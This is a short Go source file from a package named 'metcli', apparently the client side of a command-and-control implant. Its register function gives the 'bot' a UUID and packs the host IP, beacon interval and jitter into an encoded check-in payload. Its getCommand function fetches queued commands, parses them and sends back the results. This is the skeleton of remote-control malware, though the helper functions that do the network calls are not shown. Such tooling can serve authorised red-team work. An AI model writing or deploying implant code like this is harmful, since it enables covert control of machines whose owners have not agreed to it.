package metcli

import (
	"strconv"

	"github.com/google/uuid"
)

//register the bot with the DB
func register(m Metclient) string {
	uid := uuid.New().String()
	storeUUID(uid, m)
	hn := getIP()
	intrv := strconv.Itoa(m.interval)
	dlt := strconv.Itoa(m.delta)
	payload := uid + "||" + intrv + "||" + dlt + "||" + hn
	ret := encodePayload(payload, "C", "0", m.magicstring, m.magictermstr)
	return ret
}

//pull all commands to be executed
func getCommand(m Metclient) {
	uid := fetchUUID(m)
	coms := encodePayload(uid, "D", "0", m.magicstring, m.magictermstr)
	results := parseCommands(coms)
	if results == nil {
		return
	}
	sendResults(results)
	return
}
